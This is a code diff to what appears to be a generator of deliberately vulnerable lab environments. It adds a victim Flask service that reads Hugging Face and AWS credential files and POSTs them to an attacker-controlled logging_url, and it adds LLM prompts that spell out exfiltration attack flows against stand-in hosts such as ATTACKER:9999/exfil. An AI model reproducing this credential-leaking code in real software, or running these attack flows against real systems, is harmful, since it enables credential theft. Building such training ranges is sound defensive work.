@@ -299,6 +299,75 @@ CMD ["python3", "service.py"]
 """
 
 
+def gen_config_injection_victim_service(model_server_ip: str, victim_ip: str) -> str:
+    """Static template for config_injection victim service.
+    LLM consistently generates the wrong pattern (path traversal instead of logging_url injection),
+    so we use a static template that exactly implements the correct attack surface.
+    Attack: attacker controls logging_url in config → victim POSTs credentials there.
+    """
+    return f'''\
+# victim/service.py — config injection simulation
+# Vulnerability: victim downloads model config and trusts its "logging_url" field
+# Attack: attacker serves malicious config with logging_url pointing to their exfil server
+from flask import Flask, request, jsonify
+import requests, os, threading, time
+
+app = Flask(__name__)
+MODEL_SERVER = "http://{model_server_ip}:8080"
+
+def _send_metrics(logging_url: str):
+    """Read credentials and POST to logging_url — the vulnerable behavior."""
+    try:
+        payload = {{}}
+        for path, key in [("/root/.huggingface/token", "hf_token"),
+                          ("/root/.aws/credentials", "aws_credentials")]:
+            try:
+                with open(path) as f:
+                    payload[key] = f.read()
+            except Exception:
+                pass
+        requests.post(logging_url, json=payload, timeout=5)
+    except Exception:
+        pass
+
+def _background():
+    """Simulate periodic model refresh from the model hub."""
+    while True:
+        time.sleep(60)
+        try:
+            cfg = requests.get(f"{{MODEL_SERVER}}/config.json", timeout=5).json()
+            url = cfg.get("logging_url", "")
+            if url:
+                _send_metrics(url)
+        except Exception:
+            pass
+
+threading.Thread(target=_background, daemon=True).start()
+
+@app.route("/load_model", methods=["POST"])
+def load_model():
+    """Download config from repo_url and send metrics to config's logging_url."""
+    data = request.get_json()
+    if not data or "repo_url" not in data:
+        return jsonify({{"error": "Missing required field: repo_url"}}), 400
+    try:
+        cfg = requests.get(data["repo_url"], timeout=5).json()
+        logging_url = cfg.get("logging_url", "")
+        if logging_url:
+            _send_metrics(logging_url)
+        return jsonify({{"status": "Model loaded", "logging_url": logging_url}}), 200
+    except Exception as e:
+        return jsonify({{"error": str(e)}}), 500
+
+@app.route("/health", methods=["GET"])
+def health():
+    return jsonify({{"status": "ok"}}), 200
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8080)
+'''
+
+
 def gen_model_server_service(vuln_type: str = "pickle_rce") -> str:
     """Static template: Flask server simulating a model/config hub with unauthenticated upload.
     Serves different artifacts depending on vuln_type."""
@@ -313,10 +382,10 @@ app = Flask(__name__)
 CONFIG_PATH = "/models/config.json"
 os.makedirs("/models", exist_ok=True)
 
-# Seed a benign config on startup
+# Seed initial config — agent will upload malicious version with logging_url pointing to exfil server
 if not os.path.exists(CONFIG_PATH):
     with open(CONFIG_PATH, "w") as f:
-        json.dump({"model_type": "bert", "hidden_size": 768, "version": "1.0"}, f)
+        json.dump({"model_type": "bert", "hidden_size": 768, "logging_url": "", "version": "1.0"}, f)
 
 
 @app.route("/config.json", methods=["GET"])
@@ -613,19 +682,52 @@ Architecture:
 - victim IP: {net}.20 — downloads and applies the config automatically
 - The config contains a field with executable code (e.g. _attn_implementation, hub_kernels, or similar)
 
-Victim behavior (simulate a real ML pipeline that auto-refreshes its model config):
-1. On startup, start a background thread that runs every 30 seconds:
-   - Download http://{model_server_ip}:8080/config.json using requests
-   - Parse the JSON and apply all fields via setattr() or exec() without validation ← the vulnerability
-   - If the config contains a "hub_kernels" or "_attn_implementation_internal" field with "owner/repo" format,
-     download and execute the code from that field
-2. Run a Flask service on port 8080 with /health endpoint
+REQUIRED vulnerability pattern:
+1. POST /load_model endpoint accepts {{"repo_url": "http://..."}} — attacker provides the model hub URL
+2. Victim downloads config.json from that URL using requests
+3. The config JSON has a "logging_url" field — victim blindly trusts it and POSTs credentials there
+4. This is the injection: attacker controls both where config comes from AND where logs go
 
-Credential files already exist on the victim at:
-- /root/.huggingface/token
-- /root/.aws/credentials
+Implementation:
+- Endpoint: POST /load_model with {{"repo_url": "http://MODEL_SERVER/config.json"}}
+- Victim downloads config, reads config["logging_url"]
+- Victim POSTs {{"hf_token": open("/root/.huggingface/token").read(), "aws": open("/root/.aws/credentials").read()}} to logging_url
+- Returns {{"status": "Model loaded, metrics sent to logging_url"}}
 
-Use standard library + flask + requests only. Use English comments.
+Exploitation:
+- model_server serves: {{"model_type": "bert", "logging_url": "http://ATTACKER:9999/exfil"}}
+- Victim sends credentials directly to attacker's server
+
+Error message rule: {{"error": "Missing required field: repo_url"}}
+Credential files on victim: /root/.huggingface/token, /root/.aws/credentials
+
+Use standard library + flask + requests only. English comments.
+Output only Python code. The first line must be # victim/service.py"""
+
+    elif vuln_type == "data_exfiltration":
+        # data_exfiltration: victim accepts attacker-controlled callback URL, sends credentials there
+        user = f"""Write a vulnerable Flask service (victim/service.py) for:
+
+CVE: {vuln['cve_id']}
+Vulnerability: data exfiltration — victim accepts a callback/webhook URL and sends sensitive data to it
+Description: {vuln['description'][:300]}
+
+Network layout:
+- victim IP: {net}.20:8080
+
+REQUIRED vulnerability pattern (do not deviate):
+1. An endpoint (e.g. POST /report, POST /notify, POST /callback) accepts a callback URL parameter
+2. The service reads credential files and POSTs their contents to that callback URL
+3. Since the URL is attacker-controlled, credentials go to the attacker's exfil server
+
+Exploitation path:
+- Attacker POST /report: {{"callback_url": "http://ATTACKER_IP:9999/exfil"}}
+- Victim reads /root/.huggingface/token and /root/.aws/credentials
+- Victim POSTs credentials to attacker's URL — no exfil server logic needed on victim side
+
+Error message rule: name the missing field in error responses.
+
+Use standard library + flask + requests only. English comments.
 Output only Python code. The first line must be # victim/service.py"""
 
     elif vuln_type == "sandbox_escape":
@@ -800,40 +902,28 @@ Attack flow (supply-chain + SSH lateral movement, mirrors real HuggingFace model
 5. Check http://localhost:9999/received — returns a JSON list, check if list is non-empty
 6. Print the exfiltrated credentials"""
     elif vuln_type == "config_injection" and model_server_ip:
-        # Config injection: attacker serves malicious config, victim auto-downloads and executes it
         exfil_instruction = f"""
 Architecture:
-- attacker (model_server) IP: {model_server_ip}:8080  (serves malicious config.json, exfil server on port 9999)
-- victim IP: {net}.20  (auto-downloads config from model_server every 30s and applies it)
+- attacker (model_server) IP: {model_server_ip}  (serves config.json on port 8080, exfil server on port 9999)
+- victim IP: {net}.20  (POST /load_model downloads config and sends credentials to config's logging_url)
 
 Attack flow:
-1. Create a malicious config.json with a field that triggers code execution when applied:
-   - Include a "hub_kernels" or "_attn_implementation_internal" field set to "attacker/payload"
-   - OR include a field whose value is a Python expression that gets exec()'d
-   - The executed code should read /root/.huggingface/token and /root/.aws/credentials
-     and POST them to http://{model_server_ip}:9999/exfil
-2. The malicious config is already being served by the exfil_server/model_server on port 8080
-   - Write the malicious config.json to a temp file and POST it to http://{model_server_ip}:8080/config
-   - OR just verify the config is ready and wait for the victim to pull it
-3. Wait up to 45 seconds for the victim to auto-download and apply the config
-4. Check http://localhost:9999/received to confirm credentials were exfiltrated
-5. Print the received credentials
-
-Note: the attacker CMD already runs the exfil server. This exploit.py only needs to
-upload the malicious config and wait for the victim to trigger the code execution."""
+1. Upload malicious config to model_server:
+   - POST http://{model_server_ip}:8080/config with Content-Type application/json:
+     {{"model_type": "bert", "logging_url": "http://{model_server_ip}:9999/exfil"}}
+   - Send raw bytes: requests.post(url, json=payload, headers={{"Content-Type":"application/json"}})
+2. Trigger victim to download config and send credentials to logging_url:
+   - POST http://{net}.20:8080/load_model with {{"repo_url": "http://{model_server_ip}:8080/config.json"}}
+   - Victim downloads config, reads logging_url, POSTs its credentials there
+3. Check http://localhost:9999/received to verify credentials arrived"""
     elif vuln_type == "data_exfiltration":
         exfil_instruction = f"""
-Exfil server (already running on the attacker at port 9999):
-- POST stolen data to http://localhost:9999/exfil  (from inside attacker container)
-- The RCE payload should execute on the victim and POST credential file contents to the exfil server
-
 Attack flow:
-1. Construct a malicious payload using __reduce__ (pickle) or equivalent code injection
-2. Send the payload to the victim's vulnerable endpoint to trigger RCE
-3. The RCE code on the victim should:
-   a. Read /root/.huggingface/token
-   b. Read /root/.aws/credentials
-   c. POST both to http://{net}.10:9999/exfil (attacker exfil server)
+- Find the endpoint that accepts a callback/webhook URL (e.g. POST /report, POST /notify)
+- Provide the attacker's exfil server as the callback:
+  {{"callback_url": "http://{net}.10:9999/exfil"}}
+- The victim will read its own credentials and POST them to your URL
+- Check exfil server to verify receipt
 4. Print confirmation that the attack was sent"""
     elif vuln_type == "auth_missing":
         exfil_instruction = f"""
@@ -1079,8 +1169,16 @@ if __name__ == "__main__":
             if has_internal and ssh_private:
                 with open(os.path.join(cdir, "id_rsa"), "w") as f:
                     f.write(ssh_private)
-            # Write the LLM-generated vulnerability service code
-            service_code = llm["service"]
+            # Use static template for config_injection (LLM consistently generates wrong pattern)
+            # Note: for config_injection, the attacker container IS the model_server (role="attacker")
+            if vuln_type == "config_injection":
+                attacker_ip_cfg = next(
+                    (f"{net}{c['suffix']}" for c in topo["containers"] if c["role"] == "attacker"),
+                    f"{net}.10"
+                )
+                service_code = gen_config_injection_victim_service(attacker_ip_cfg, victim_ip)
+            else:
+                service_code = llm["service"]
             # Inject the standard credential-fetching endpoint (Layer 6 fixed logic, independent of LLM)
             # Ensures that after a successful attack, real credentials can always be read from internal
             # internal_ip is computed dynamically above from topology
